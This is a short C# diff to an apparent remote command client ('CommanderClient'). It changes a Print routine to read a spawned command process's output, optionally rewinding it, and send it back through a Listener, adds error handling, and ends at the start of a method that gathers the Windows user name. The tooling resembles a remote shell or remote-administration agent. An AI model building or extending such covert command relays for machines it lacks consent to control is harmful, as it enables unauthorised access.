@@ -61,8 +61,18 @@ namespace CommanderClient
 			}
 		}
 		public static void Print(string[] args) {
-			string output = Listener.CommandProcess.StandardOutput.ReadToEnd();
-			Listener.Send(output);
+			try {
+				if (args.Length > 0)
+					if (args[0] == "-f" || args[0] == "--full") {
+						Listener.CmdProcess.StandardOutput.BaseStream.Position = 0;
+					}
+				if (Listener.CmdProcess != null) {
+					string output = Listener.CmdProcess.StandardOutput.ReadToEnd();
+					Listener.Send(output);
+				} else {
+					Listener.Send("Theres not any cmd to read output");
+				}
+			}catch(Exception ex) { Listener.Send(ex.Message); }
 		}
 		public static void Info(string[] args) {
 			string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
